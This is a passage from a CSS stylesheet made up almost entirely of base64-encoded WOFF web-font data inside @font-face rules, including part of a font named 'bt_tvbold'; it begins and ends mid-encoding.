lXVIGjmDFili1ew6kgFa6ZcwWpIVbAal6xg1adXsGaSCtZMuYJVTypY9akKVr3ZO6XD3ywl6OUKVl2mfvEK1qAZX9KqWA++NvLi7rRKVtVg4qcfvclI8meWNu2StM2tzr0b2v7bqnMz0CCcV6HbOfLayfQqXfpluiDx0zm06WHvtDhtpOJIMMq0mVK0mZekjU+nzUhoM8q08YQ2PkUbD7QZ8DfQxsu0GYz8orRhtMLlVs2duuq//fkPftDf35o2e8p2pG5igsxgksYRoHEl6I9/WZRGD6FxFaFRKPBjH5aYhQS2LA4NemhIFW0x2WkVqzWS/pBwADpIuHolbCtXSpWd2UZSbLMEOt50dFYRdFbJ6HgJOt4UOl5Ax4O/AR2vjI5nlXcWHdGxEl1BcohNARLAgjEUVySNIxaNUiWDVHOrufNMnprS0jZv2Oh2OPJ5btTkrQ3taN5gL3EUZxnTIR4q7W4s9RSt1duyir2mYHeDr8pvctT7P4oB5pyMeStgbqZssJ//7qKoWwjqVgl13i8UBuMZkrczO0ACjXMR1qumMYcWtyR5qmkMNS6BsC0dYStB2CojbCMI21II2wBhC/4GhG0ywharLQ3hPHuyqd4somkJinPfpmHpTnpbRwG3bSmHaxLAG7LD9aP9TC+zOel9pZLYqfWAHVqGK6m/XxS7bIJdjoSd3S9bObj3zZzd8c7FL8+YdCuiDwS3vUvgl5uOXw7BL0fGL5fgl5vCLxfwy8bfgF+ujF92Tm4afq485FASRy0phEOTlPQ3hztTPhYUX2luljQ4R1xV7eFQe5XLVdUW7j3oAVB7N4b8VWWRYGVKbDtK2zZ73JvbS/0f3+Q+9NEQQLvXX1Pj9927RbLddRSlbCN1fibqU1KWiEAF5xam6406udYvrlDrUvXiZsxtwFavyZJxXTKzRypWxzpACi5AMtiQwNlCdfhhaSevYxl23cz3pYr1GSpRc50upPtTpeuycP4bUleecJNeA+upJ9J6DazDjXyyohzdxqvlqY6k15avkRp8xgrXkGhrtoZk1W+As2t4sOKLVwbXkSaffFyhs+XmEdNqNbb6XImZeLFCT1D2J/9+zQsM9LzYirQ7XcMs0dFg97AxvCmLbFB53LRanG5z8ciFhzxLNDkIKltTW9fB5H72pP7QazQnzS3pNwC6DGPmzct1HDDeRccBPlmJrIvM6zyAiiit+8DMWbAfUvOIxsP88dT/F41n/jhA1aeNI+Ekel4eh6QG52NjWh4b812MxbI0NmaipdPhkXX0vJFNTEi9uaSxtZK4l4v63J1HJ1j9ghO2xJKayAkkszKXGC3J48Igo0lFiszR6ZuvItFOzNrUYNq5wRpZQMNSEbQ0otyLRNNSBN6YH1aDOVDCwgbLksRgV1IxLrmYSSCWu4ZFlSRxEDPSOOJFJUlgZhd62ZTAYVwMWevDMyRlm6HG4XqJpa8nUFIrhrnXAxsqA8vnx4FTXohJEyFfEXPpr8CvKFxTCbZusVylqCbXzCDeX0xAxmCjVpVUiqw03TjGcmmaHbHk/CYvzN6ehOu2kznGLP3NyQoBhlQICI4getpwQrGoJHd+ZFPeB2FeuZy1j/edVyWQroVbk1OTiOmSc5Oakg9bcFCpt9L6QJ17hPSRcFIPyvEdPlk9mQccSFMGDvRtYRBrHoX8AEkcMpBMT15JNro88c3whbCZNfB4aEA3Ai/ZKxq9XJFF/AMae0T2BaQ1WnFiDCbZagX50EL6rZy4Z+uxfxtPPDv19tDz2HHlmb5p+t7EeWZ8lHlqtvEKMz7zu2TvlYR+NLnmuW6wezXUqmQ2S1r3BcHpJ7VjNpKTY8MUNrdfNADNbkKIW4tWrje5uKa0GswwWmVM79Uwlatk4WSOkSSJ5RqltN5VWpK7IOTwosGJPU3mtXAQbU74QnFENLhJu6f0lg7sHY3VZMOH0J3M1PRuEEuaqSh3SJ8I4HWpt/nWRTtFrF6sU4RP9kFOGRQrVxH1+Xs2i8Als3zDiBFY8nfVNILzkb3c/3/0gFBhl6fnVyBy7ooeVi8rrrk0rVmCJv9iNK1No8n7B9KEcm15slyS1Ps9KCOKL0nbCNC2jqqjDsu0bUjSVgPKzusnBbmF5FEChcWwRkv9hPpS8iSFUguu0XsI/SH99JQlhGt0HSzHkJHotxIjKc6JZkigYGv9EliGcYXBW1FDUKnZIKMiFnphNfqXQOfOm0h2uWYo37jTgj10V51SOO8SS/lWz4J+HpyMbSvhmyAVpfoX4RzAUqgIxr2S5gkHkh1AZU5CD9saUEJrjKT36gY43DDLX9gFdN0a5C+Hi8TlN6C79/eXBEsYGsuznXqh+XF3LHh0gWlC+kK/zzFcB+hnyqyhwxrarqFVGnqM3pL41mN0DV3zMCaTDSReSrxId9K19OY9iZfozT2Ji4kXP0tvTrwk8fMe7piyCfQ7Yt4j10t456zVdQThXD2pBcE1qgcsQ1gLgtohy0FSvs5rzHZFIakH0ZvEDC1uHb1mybHp4s9n6B1UQRA/nb8nCQdZWxLsErfKZca0B5udlrYq5mTVUImbwNuwN9R26mBHI0LcuDfYeupAZ/03bX76DVd7BBGecH1iIyKe65WBdea+kJjuSbwSI+A682K0sZeuiO/45WfY13JyHzl7baY3Jxeh3v0O1pyTXiMgu3jKin1FF3YbsS3WbSRZghEzmDB8vmjHERRN6V1HdKApFrYeUZ6V9iH/jeOA7Uf6OPaDhF84DsXI7D5kdixZ2PFh4Vgci40FA6EsJZWGafi4wWyxyRmkgnXxkcnSO21wpyUxvdTwZJksja+V5JF4qG0LRwiGjuAOYk9YFBpOEBqrkiOeMrEofrNU6WOfWqHTqKU9R75fXAHmKzZ0zs/CXgKGJWBdSiikUXNo4epfhAFMC5c6zAHpQwJzoKZ0+CSAuZ1IMklDDE0g1QYMm5GIDFmDC9uRoOKfbUnCkd3nbFsSjpInfranlRGkw71plalxA092dmB3xtmc2dZy0h4A2y0zfCCA3mMrqdWVrH8xh+elFHwM3QTntLcqk3sVxl7q/eYX773nS5cGzj09/oPSzkMtY4orZ6sGYn17Lny+OjFBf/DsRNtQo9z/ZfT2NPtLxVtgY+yVLWV7MGYh/fFZeRewip2Ou4ossAuQijMls2NNBtEQ+dI2ZUpjyIfZdgP7gjENw425SdGXuwi2zCju3KAy4pzFnqOTbBKMZOuySONkmR6c79ko1bxU1fSAlpUf/fal7sfbPO2th54Jdw+3lH/M72rzDu34q1Pu3P0PPriteztXfOON6p4D1d2xoOc7p7pOPrIxU3/SaB45cPLY4cP7e/7sS1/7aFrag5N+IEo9yVP0IgZ30RFk9bIdQXzzchXjWj6bWJj/FT1B0Iheri8Id3nkwp17g3CPJk4voP/P/5voP4/0e7wpAAQrL6z6I2HAJbgcDIMjl8fuDANrSuYOpWPhgvVwKB0L9xwsVs9iIS2GFYDFCtIafCEWyP0rAItYpj4vQhj+AqCRX+B0zYGj8A+BIxkYWrZhTOePYj96cWDPw3fuG8M5EYwrV24dSDaQSeFSrvgl4FIB9vrL6bhsmoNLbRIXMHdED3zkWYdCwLMG7PcNfrEItMmGIjyzIW/Wfq8E7CqNQgU6q4ij3i9WGPGUWDMLpz8wi6iwJkgM+ho06DP5bA/x6tp4srBqbfIjAeYmAIuedfBu/TJwLmfsL4eyb6G1XxdMWvvqZbCvDXY3+j1Ffr0dzHxz8IGUmd85OxkcmQs/6BOMj6B9fy59NlbjlgkVWjgYL5EUdUUgbX5KZ/lWsvg9uIYReBeoaY8R2xYmEd9AEF+nwrlM42Y0/0lgQ58Zwdz1KW02vxrwF61+YHF7uIJE40sXn4Xl0E9zbM1ine6SXAL3cNIoGEhhvCVlHSyO9rdly+BWVlIQCGm2AifLgkOA8xoqQm2h/k86zoE5XB9Ocf1qf7xCikZt9seL5BCFVB3gB4soz49m0gYjSXQOzUJdRR7YYkwXGlgyUAU71PMIb6AIAXZTBElKDC/B4psr4Lw7L3JXTD4beEpTLGkBqCWQ/urcYJQhifdnkxGpxeFWMKWfwPjUJ0v9rZvch26pk6D/h3/zZr+vYUtSziiOcTpqHbWJqqe+IT33RlgdFNdjkY3EyGCeIOpCXSCuiAYAeKGAFKMJ1WCR3is5BHTEDaAEgCsDYrWW9NeuNoqb5dbDDfAaSiknJbAwH8A8G6HaFLP4y1FGb+Zj9pLVpC+xKVaw0kOYen0A/saDD7SJ8iK1UgoN5c5K62Rq6ELsk10csIORNa2FUckcpbaGxgqEYqmpkbIu+tCRJqF9tzQBHcf8kZFd255oc7NpLY76n4/UvfgQ6LvW7sYDoYLc09v2MqX0Vd5/f3X/IF3QvrehsG3nx8hMRFpr7r1n/+SnXSVWZ7S/NYjdj2orQ/efHm/Z5nOVH2itfyO4vbH0OOm1lXCTXlth1IEhnIO84Jx2Wxhs9cnsvT7ZeAs9vtj21Kmejjn9KOWd2WD8RTC3n0fXS4lnXYjUMvFTOltePrEDk+VMIV50rrpT8G2prl1LBN9Klmjl5esv58PVWYH7yvz3kOCbtdBtLn7txcV7e1ns3GKhNzudTfiV9MQCeyGPZJb13kVXLN8SXbHWyF2x4gqzQzKT/kv6YqGleDe9sbLQWlymPxZ7kNiLc2nu+y+g+TzSvGq1RPQUEC15Lf9wqtEwvBuqR9E4XIZqxk3Mw3S6V1B+jNXNpdsLdBdLdBfLdK9N0V1M6C6R6cYHoepRludjF9oLQH1BYdEKQr4JyXcuQn7x8uSncoSW64m2TzIFR5dvjcZ6JXNw5niyRxon4QD2B3oJ1lFV1DNpSDjR9FgfjLsl06MyIGGDT9NZJWGzSsZmUwqbVYGpfD2qxRVSjotXQknQGoVyVIshOB3yi+UqqSQotII3TZkdirWIVzkv2jCEKerNUq74Kn5ZmOamsCRLgtJOLolbW9LIaElDbkfKzFgKw1dls2LGn2SpK7OGBnP7PRC4VaTeIS2WSafFRjMWiY2ycmxUD+tWMYmtLT9qIm3BGOowXO/60tcjsdGMpWKjh2FFCJNSOYV8RRxjHH5lwTXnxEbptNhoxh1iow0SuxXIl71yJXlh9vYIXLdCfgZ1DtZBkNgoKf80p8o/HQHST22x6GjGMtFRel50tD/lO2ImjQsKQW/+AseVeiv3qcJclBWgCQeoWBElOUOkpwbyaPqFikxJg1rSg8WgB4slO1odEPOU00T/Fafa7Pn58wqd3ppVRBZ5aBWcz6Mi8jPLBEyo1lntxMVn4kkT6qTmW0O7FSF8mCwoOXuxNfnADzQeZMf6RtpN9imNITATGp/zm+o2Jd78YfVf9pz+91ba9Wqo3mcu/szX//zld4Sc8s6axq6gifF97lNgKo93n+6Pbg50f6f1mdEHg5u0x7S7Wp98clv9+FfHKrqvxfr/6c3yXU3+poHhCrvb6K1+mvi1SE8x2BNiDOfIEl3F7i6KE/ILlmskdmMKCOuMAkOeeafGXrSkF9k60osMhCjhsxKj9OQt4FdTTGnwEg0p9/CbjeQs1pjszhHWuW3LRu60kVvQ04x7a4mtm6w3LsDamRebnNPtbPVi3c6WiU0u85BnVPzLNj1zo9pfrvEZ+4OU/vt/TwdR5cvScQoV+XJ0MA/Ljp50WrJhd/cxmZbCJC2rZv06OUqs1icRRaQFXTnkGaAWrDI+b7DasrIVkuYmzodVhUtSlvLULNOZ7oCsnZdtUMe6ZOXcuKBTXYpGeX3W4QqVYqxJGmvY3y/GqsQtlbAOl6YF29n5k8HWqASNUIwf4eJEz0zxOjDrDA6vYsMdYq1z8fn94qwLYGu+04L1Lg9m3RIreMazAF1OxhZr9wqID+azMrrFgKZddr/kpdwvBG//nOcsTlkK0eTJVpEHLa6SIJzaoF2FQWziccGoqxRqzSZLp9hPgPQXL8lgc70n80qe0+2b+dB1pOyaBTDtTFk3CwC7nPSf/Gy+vNCm+VFYajf1IufjjpLa3xzgRSHTH1dJ2Mh1wFKrUl5uVQomihEkvQq7bcoqnTw/b4lHDOKD+U7XhYIN9aFgffKV6RgbS7wTrqspD9VVszZysHVTcl3sYS9w+0isNkA9LMdqV82RY9JjSHOVJFaLW1q9/BjS2Vitf9FY7SrshWhzEJf3lJ4qCEixWlGdEZnTNzctwqFygVJPj9XakqFaMlHBVnf9M480bsHJSh4LlgK60h5y4hSNeTfhjMEZMkNG49F36m/sw0ni9UffqbtxsGEkzHxOmwETk7jXgtNUNxxC/U165oEMtFIO6tNLds3LvnPXvJxkeNKG4ckpsz3LgRRnmpZvoIcaakETvXFUSIs00lMcBsk9d8yf/GPGjOHdKbPNLo2Wl5sw3XG8GPFd2PTPgZpnkQFzXknZpI85F7tELjHmvDuPOX8OznHAOTs3BTRWyDqWG76sfhZQ0Cipm6VpuHJFWjeH5d7mVspJ+ag/nU+JA8VecTBeIC1tb2CWtjUp2siDqXNV84gUVuLpIjhd5BdXqtLpxrVXlIttipXLTtBSseMFJC+Svroo+a8uGkMmvQBhPm1gOyzZDTAn1Q0wd9lugMhYS3cEpLuAwxZtC6jUyfYMQx1JjJMe/9iXtjO9Ly2zeF9a0uXXEiA9sdO70uaC+JpSGu2SB2JuS1plqiUtf8eWtEcmQ19qlzrS/kVfekfarjrSkVblnPl+qP4OLWmB1wjGpP9UEdhnX6Bi2chdJcF4ocRdqwNL4A5Gm/0alshgYBK3iNLT/gRPMsTh8oselWTHYXVLjDVrI0RaixnqCOlPiF7fZWZsKU5behb7FrLc4nM6uSjPdd+eVl4nvXTWUk9SUnQec3Sz8ACDaqQTFXb8I/lGq7npeKYxS5F8WlapFK7VE1Qwm0DtDgREXotdp2I86VbPk7xx3kB+mzVeMYC9zvKwTb8li2yxjLzkYsnkY1SeO0LAmpuDFEor+wgt9RCrdV94/fjeWDnz41Q1iL5c2Hf8tS+ULfUgq22tk3Ju+enWB/a+QZufX5D1Jtu7Sqwt9ZAY5VelZxKCRMItiuCXrDDsNxKBtzWBeKWlAP1RlbI/SrJyVwG3rJKS3rB1c2UA9zFo4GLbYLRr1+F+vVhBnjcuqoswEmCKZTjIAwyNfMyck0uwcsjd/OBLOfilStOUkVpFopSRuS300+ICC8ICC3dDxSnfXmnPmf59E6WlZ/bsfLLdzcwcddZ9Fj1VZ+87KIZKJ4f6vrY7uGCbxAjEcbUl9LFyF32z5zujrT3t7T3zXFYPdLQ92Pzkpf55Vp0y6QFErKU8mlZKTVmoQswVSs+kwTrJ/CD2XebJ45rJ40E110SDinhrVBkkgRp9OMiKOSry0FDRoJG6pyh5fPodtqIhrZkXJt6wSyy+2WScDxYrT0jLzTm4yBqjqdc4gS0lPi4v9h3BZnfJ1iOkT2+yCY86mctOnr8qq9XXJC2a9HDh9U5wcbYb9l+F2E/UTtoJpvfjzCMPiY7lkWYfeaQfp/QU1UIj2RPwcqkaYsMXzu/HKSryks+UuOO26cSddkVLey3m9o2i5nSF+mM+o+hbHEU+sy/ocyS1dOHhTzhK+gvyffXy31envj/E/ow+TWrcVktd5OKZCkoz2zlUK/UvQWy1JCdflewLGg7q6VRx/FCtL15cafRWNlbV3sMNtZyrK+0L4rPCP9Ym0dHMvk8Pgjwm90HZG6dm76O8Jj+qnNxHek65YZHnlCtVzcUVPNwkWltf62Pfx3tE15W3tFW1nNsq3+d2MT1IK+E+q0gvHM3d3MV+h7u8LRPS0hYFqqSehuzP2A0EswLSb1V2vkrACXmwfAvTsBO0xN8az5bu7UxHEiSgwEWEbLDW7IviWnwnnOmxpVGvmjMFDOLP8gR/MmacAaykkSYBto9kzCmE0J60wZhzZ8ecwguzRowY5BXNBYvOUfAOaP586fmbP5kMziXLk7ksoBqIhDEG5QkVHH/MiO1/4Ijn8sI8xqCpg7SFNbGnwKZcQ2EnMYUCxZ/8Ij8uApkCT0ov6Y2I0vwSB30tgw11n2st9bV8vqF+sMXPtFc/1lZW2jZQW/3Z9rJ1bQNEpwzdnla8BPhItXAtMKto3FidwaDci0g05AQC5GyqOdGKtOZEclAgbpLeSW3O4vkSgsVSa7AlVEfxop2MTKkjc/JoQG5uVD3vlaxV6ipjIb1xnFRSZShUlBYfoxYgRcgKVBocYbK5/QBTfQCXuI7ABORLzV6HhG3Cc3vvzPbcQVl4e5qrgTUSwe6LWD4r+kDfGNE+tIN9SNHrjJlkx0ZJzeLcgbhWQ86B8pYbNeYCX24gUagV+unYCtKXbYUbtVcgxq1INb/WBMRyzHHjgEUziAFEYb+StRHRrpXrnMyhoNTm1hUKVrJpkXwVGIt6GgwgOxzks2mP4nIPxRj4L/ayvnYgNtQ0Uhb509amRxu9Wvr7CQ98QP8osU7tbvz8p2o+Xx19ovFgvL88k2H2m9bYCsL6/Tu/83Sb3XYupyi661D9fntZgclt3Y+tj515E3n2lqde6YM16WFuKPXkmZsWapfULVzU6IIpTNhAsvWiEkxitR67HVulB3Eal3gQp6CQKs7RSaol9qOB9mJ3Vz0oc1vKnYUtumgee9CjSeNieQ/T994owzx7490jhy8OCIqa/ftnvsI8MPM8888JHf3+TDb9dmI/vSfhJ3oRFswH7AeoY0t5J4/Ht7TS86vYF8izansosjkASZ56hJWgwU2Qlpv7LCtrgDhMskg9n116lpXcAQmpsUsPecUNI/pNLHbMmoG9uGCGS2kkibnwqVbksdf4XKvvfavjhK/62fruAWbLZGI7ebDVxKkC4wl7/r0PfOWWjt0mP9sqfeyPymPXymM3JB0l5iWGvGj/Jnn0yafY4Ogz7PIjnww0Kd9FY1Mz57lc2Dht7pO5vvet3X/dPOnf5u8eoHWJ92UKPAU3+xVurR6IkJ7OReooFQkYvxNsAth9FJI9eE5Q7mqlDWI6pMAHhEycBb08C6K1KEiIEh15yFw+v1BIyMIO80WBWCFpxFGItBRIT4lzBcQc0n0ewxJY0wsAkEyK3AJMrPdESPWhuoR07oM9HrzaeZKrR4mZHl7esskE2xedNvwJO0PrwnJbWcBg4tnOidRM1k4mtuFkTtLP20t7I90DgMmRiVPh6Px5xZ8nn2us1JnufSBZa7oAI/18jMyS60i0/4HQ2AKxnFz8LAf7l+SQBSjql0TJgHY0JXpo6ZEkSjidGVmA0XzGWASjr491TuwWkFfWAq9kJv5jUYzmc46EUfMGCaP/D5GrpJoAAHjaY2BkYGBgZHBc1sSbGs9v85VBnoMBBM5NMJ0Ao//3/lPkYODgA3I5GJhAogAzVAq9AAB42mNgZGDg4Ps7E0hq/O/9383BwAAUQQGvAX4sBegAAHjabZNBaBNBGIXf/jPZhiKlhECNqHjUQ+khSPAkVg/pZQtBYg/BQ5E9CFLxuqiEUiSEsoQetFgViWAQqSA5SPAq9FA96VGKeChFT4bqoUh8/2RXQmng4032n5n9571Z+Ykr4M9bB1KVGazJPkK7jhtk0/+LaiaHkLVQprFCiuYtyqzdkhwq5h4iaiR7yPPZTbJDHpGn5DrpkVVSJ0vkrpvPtbpHiglR9ntYsI+5zzI65hsW7Q461nL8ndrm/wN0REgfk7Y5fO7Po5MZZ/0P63OJxqx9Rtm8x4TdYy+bKPi3ccpewBTnFOxpzMo8XmvP1CLfXzM8u4W3YF7ybCfQMlUE1IB7BPKMPR13/1veFpa8r4OeaXO8jZZ/BjFrMfsMnHKetBHLAd+x7dY1uPdkpo6CaWDKrOGYuYzz8g5lqeELdVp9Sb3n+Hfim3o5q3N4zsiCZ/3BPk/St3Hn3bJ6r89Y68kTlJyPRdwndT0LzxnbT3xPTtd7V/m8a0q4qOuzZ9FNqNP7mvP9CPwu+9Us7DCLFObgkxcigw/kle0j/z+Hw+h9UNUsRtEsNLMZxOr7UWR2qdVhDqN4W4NfzKJB7ZJVs5v4rzkcRu/YMJ/GKJqFy5o6VsQi70jgegI+kg07BmQneC8SlTfE8Du5luCRDX44dwDNIoVrkdXvqY+IVBTTZK3ptGIeYsUvsca1EqLi4L7sM/Kf45zZ5/gS/Z+j/w9IjPw/CG/MCXjaY2Bg0IHDKoZNjBqMe5jamGWY7Zg3MT9g4WMJYGlhWcRyiZWNNY11CesftjVsX9gT2B9xKHCs4dTjLOLcxXmO8wMXC1cZdwH3NR4nnik8t3jFeH14t/G+4+Phs+Or4JvHd4dfjL+M/4CAgUCHwBdBFcE4wTVCBkJJQpOEDgi9EZYTDhDOE+4SXiGiINIick3URXSbGJtYj9gFcT7xCPEp4psklCSyJI5JGkhOkjwnZSM1SeqBtJD0JOlDMiwyRjIzZLbIishWAOE+ORO5DfJW8gvkjykUKWxTjFG8ofhDSUHJTumTsoBykvIGFS6VCpUZKm9UDVTjVNeovlJzU8tQ+6e+SCNN44KmneYaLTmtG9plOio6FbpCulG6C3Tf6SXpdelt0Xugb6A/y0DLYJLBH8MsIwmjDUaXjKOM5xk/MTExWWbywNTAdIOZgdk2cycLDos9lmVWVlbnrD2sj9h42HywlbB1ss2z3WfnY/fA3sV+lYOMwynHBMcVTjpObU4PnF2cT7gIuVS5MrlOcfNy2+J2x90GB/Ryj3BPc69zn+Z+yv2fh4FHl8cTTxvPEs8rQPjDSwYI13lzeYt5l3hf8Unz+QEAOpiTMgAAAQAAAOsAVQAFAAAAAAACAAEAAgAWAAABAAECAAAAAHjanZNLTgJBEIb/YfABGiIuiHFhZuFSEVRMdKcS40JjQohuBRkBHR0yjg8uwBE8gQfwGOrSlWtP4t81hRCCkJhJpr/+ux7dVd0A0viEDSueAKxDQNlCkrOIY0hZJWUbW9a5chyL1rPyBPlVeRIL1ofyFDrWt/I0lmIN5QS5ozyDzdiL8iz5S3kOSXtWOY2UnVGep76s/IaMnVV+R84uYh8+WmgjQBN1NBDCwTpyyGODtIcy/xXcosaxSPJo4XPu4JizCn0cHFGrIUsqM0ITd6SQMVtwcUmbC46O6pf0Dji6eKLu4Z5qEw9iYdiMVfp2c5tcHufd6O7Q2Dekdp+1idGLWJPsZs8t5vZxRe2CUcx+ArJH71As6hLd1+wm5y5XPbHr1qfrZSIHsnNz9mi3ZZyiRKXOzCZq0Kc7AysONRPBnD+qaJ5xclL7v71G+xiP1QGP4V1bGeir0R2xd/V8delYKPmiGoakCsmVege4llr47MP4uzF6ffSqqXrI3u1gjd+jfFnqPZ8b9ciyrz5na//yGd/DM+pVucO38lKi6h/I7XBwIrfKvJ+CrOWYfRPb/Beo/b6rH7uwo6IAAHjabdBHbBNREMbx/yROnDi994QOCW13bafQbWLTe+g1kGZKAg6mQ0D0KhASN6JQLoDoVSDgABG9iSLgwJkuDsCBA2LDPm6MNPpp5vBp3iOMv/X7Fxv5X30yWyRMwgnHRgSR2IkiGgcxxBJHPAkkkkQyKaSSRjoZZJJFNjnkkkc+BbSjPR3oSCc604WudKOQIrrTg570ojcaOgZOXLgppoRSyuhDX/rRnwEMZBAevAymHB9+hjCUYQxnBCMZxWjGMJZxjGcCFUxkEpOZwlSmMZ0ZzGQWs5lDpdg4wiY2c50DvGcLe9jJQY5xVCLYwVvz9fslUuzslii2cYt3Ek0zx/nBd35ymJPc4w6nmMs89lLFA6q5y32e8JBHPOYDNTznKc84TS3f2McrXvCSOvMHv7Cd+QRYwCIWUk8LDSxhMUEaCbGUZSznIytYxUpWs5Y1XOEQTaxjPRv4zFeucoazXOM1b8QhMRIrcRIvCZIoSZIsKZIqaZIuGZzjPJe4zG0ucJFWtnJCMrnBTcmSbHZJjuRKnuRLgT1UH9A0rdxSV3o0pZq9htKpdCvL2jTMAKWuNJROpUvpVhYrS5Slyn95Hktd5eq6oyZQGwpWV1U21lkrw2/p9tt8oWBD2+BTd/i91h2mhtKpdP0BObyfRnjaRco5DsIwFIThOA6Os6dIhYSUsEnIJVcgadIgKhtxDmoKKOEsL1TcDkYsj26+0f8QzwuJq9eT3tpBiJsbOmVsQ6XrqdphnNyElDlYj2TdkjQbCur2Ls++eWMEBPsPBKlvEuJVY98MsjuCGgz/jEC9ZsZgtGQmYLxgpmAyZ2ZgOmPmYDZlFmDeMEuwWP3oqDIvJuND6QAAAAFSaoUQAAA=) format("woff");
  font-weight: 400;
  font-style: normal; }

@font-face {
  font-family: bt_tvbold;
  src: url(data:application/x-font-woff;charset=utf-8;base64,d09GRgABAAAAAGnkABMAAAAA18gAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABGRlRNAAABqAAAABwAAAAcaJHAJEdERUYAAAHEAAAALQAAADIDCwH5R1BPUwAAAfQAAAtDAAAnZkjkuXpHU1VCAAANOAAAANkAAAFKiv6qnU9TLzIAAA4UAAAAWgAAAGCXA3w+Y21hcAAADnAAAAGOAAAB6kaLAB5jdnQgAAAQAAAAADgAAAA4EOkT5mZwZ20AABA4AAABsQAAAmVTtC+nZ2FzcAAAEewAAAAIAAAACAAAABBnbHlmAAAR9AAATx8AAJpUAL/Ns2hlYWQAAGEUAAAAMwAAADYD1bYtaGhlYQAAYUgAAAAeAAAAJA+dBe5obXR4AABhaAAAAjEAAAOstPhJGWxvY2EAAGOcAAABzQAAAdhSu3gEbWF4cAAAZWwAAAAgAAAAIAIIAXduYW1lAABljAAAAbcAAAQybnCRoXBvc3QAAGdEAAAB7AAAAujbhc2scHJlcAAAaTAAAACrAAABGn/nrGp3ZWJmAABp3AAAAAYAAAAGhONSagAAAAEAAAAAzD2izwAAAADNw+fyAAAAAM6QNWJ42mNgZGBg4ANiLQYQYGJgAeI6BkaGeoZGIKuJ4RmQ/ZzhFVgGJM8AAGAcBQUAAAB42s1aW2wU1xn+ZsaX9eILLA4mhmIuNoEUSNpAMATIRUpDwCUNDW5CDBEWsVQlRiWqIrlUPLClDX3o9qlSt30gwVnStDEbSBtQHK5F+4RUZSVMk64aIqF2Kx6iatQHq+r0O/+cmZ3dnV1fsGjn178zc+Zc/vv5/2PDABDFIqyC8eq+7x9ABDVsgeNAfTFeefk11Qb3jd9M3i001vy7/QaMmh9K7278AD/HP2DjP0bEaDfWGr3Gq8YvjF8bKeO2ucXsMw+bafOy+Sfzuvm5OW7BarYWmtetpdYKa6G1xlrL3yfMy9ZWa4d52Hrees16g31g/cxKW5/w20K2/qXm9ZrXLXAUEbXodvLY6OSw2cngOPEqcR66CGuI3U6cX1N4RHrEsQUx7OaIPt738L6X9zj7/Yh4lPhj4k+IbxCP8dtxjrnIfpeJV/lsYiOltIdfTWxi2zFnA592YCVnO0sZqLU2OVn0EY/xex1bxqTn42pVx8Y+GXWLsow6o+iUvjm29OAUVuN9bMNpDOMM22rZI4PtToJfVvLLSn45yNWjThpNnKWTXzcR1czurKpXH3v1cXyGWlLjTbZ1sW0r5vA9gRPOQbztXEGKI06iFe+w7T1nBCOk8xQG2PsQe9/Eh85RnGW/c841nHeGcYF3JYVWzpJEE+noJK9KGo9TTn2kaR/v+3k/5qzj7FdwkiNGKJVTWK/pOku6Upw1wVm9GW+jnjPm9IgxjrjGETs5YoAjromccmgWSVyjTqJaGqv5NSFyamSPOHka4Bwjeo4RvaqS5ghXPMQVk1xxmCvmqKcoOXHlvZM9kjSyjcoilNapFYNPD/mSG6AWhUL2OEk8RQm9T0pO4zZ77qBELLa1sm0z2w75b2rto6KFnPRbLc9Z+bXZy+UrTx5sacvzdyPlRxsjDXtwr163SVv4Jn7zdF0rrc1sde3KbVWrDFBi3yDvPcRnSP+3KK0gdZf4rnoMsMcAewywx6GSHodIQ7OedzmedNbjKWcZthKfJm4nPktp7yR+m8/P8b6L917ev0N/eIH3vZT2CY4bJr5NTBFPEt8h/ob4Lvv/lvg74nvEEeIHHPd73v9A/JB4lniO+BFxlN8+Jp4nXiD+kW2G+JzBqEN90gqaMRudpPd+PIC1eJj8d1Orj2AT+dqCR/EYfWAbtuOblNIz5HoXerEbL9Iy9zAOvIT9OILjeBNv4V3KI015nMYZXMRlXMWf8Sly+Bv+jjzjm3nPbhXv5nw+96dYgQ2MfAlKKia+mcddvpyck3CG6B93Y61BrjbIe5YWCifJt7ST4fp5uacJecLQjK2Xdno5ew/t3H3v978UrUFKElzfg9z0pUFfjCngyglnlB4XK6xHrmVe0XEsQGNetfDO/vTvqa+Zcmyu5L2N3gU9xklzr+bEa8trtEv65svfSvtMwkYPUjY9zjjl1qXsiI1dIucsvSYWnJ9982F6cfop/yQhK31yE6w4rnoofTlfutR6vAmOT4pqZcu5ggT4lqnW2+VDW5B7qScVE6IlNlZFUlpeec+KK3Pq02WHWHGpNOywtrC1q674peYxSwvq517uSjXrSrSaTjgiRGci3Q7af66yTDjSLvgEd/dQuyzoNlxO5Zqbqg3PgNfZE1tckcVn72CtTLWdyIs23D9jWKB7Ks3GmJuVxqY8M7PSuXNioQl5TtAn0+LRKq7Y4T4i/VLOo+IlXTqSqx1zATOFaNA/GEVvlc6hrJewQeJ8P3/VXpMMclJhTYmrskvlnDFSrKxwtBATKsYO240QpfFQ7XKB2JAP0zDXyJLKXs9mhcJoiPajJZEmr/sVaZ3eMaT4qOgbGUrL3XUYZ5xLvg9ny3pmy/w9K56r9m5beMspuWo+7UreLD6b82Ko80+tHRWvimKMzJkPs/8y2uxq3kGJuzvyIPeQOOukmBtpKRe1GySDWUDx3ByhICvUDsqYQXKmIlev2JHNuoH2TxtMsTWFtpB9K+PGFYGM+zQdH+c8o1W+jumdYkgojmvLu6V3sHSRNIqjhJaBUJkUHlOyWob8DZFLP7Mozitkl4LkOZLp8En0JZlBtkiK+XJO1PzaFmJe5sCVlIdnxHKiojE7uJe79sd+YyJzzwNi5T4sc4yUtN0U2ec9+xQbTep4YVfIOdLuTsy8o4fS6JFqStHRQUrjwQxSIllAPuw94MYZ33ISaj3q5gltOYOax2HO1OvbcM71ald+mq5oWFanqC6TbE6kaLsxmOso60t6/hhqOKruWCB03K26Y1hH8kR5Jl6sR4nSoxJ3chLfsne664aMZYVMDL6j6N0bV1duxzOXATj/Co/NlXensL0jGBuLImRXMD+WdxfL65atHLez8E12jowe04XVOn6slJY2/M+u0J0lWsIlinNm2bNzosdEWXYwWjznZPTKTLZkz6+ux4n8a2L/k2hoV1vRq0okgqcLHPl7uh3MOkorMV05BC1nQXFmJVG3K0QbtA6x1EJN26siedk+jHKZTUP74xPlqFW842ZIY6zUUirN52YC1XmSy0AzPpGTbgsmsSa0Vy2hEHfqEUGDOmPFLDSiidCMFsyWpzmkcQ7mohX3YB49bz7uRTu1sRBf8WdYhk4s4r0Di+UNWIKl8qS+dIrmluO+KQrbnFSv+gBEyUVUQ5OGOYIegDhPQ7umvQAd5KJDA4q48wCC3tUpnt6hZ6rOSyk3FnVUh1uB+dTT10RKqyivVW7MK7vWEtxrPR4mzw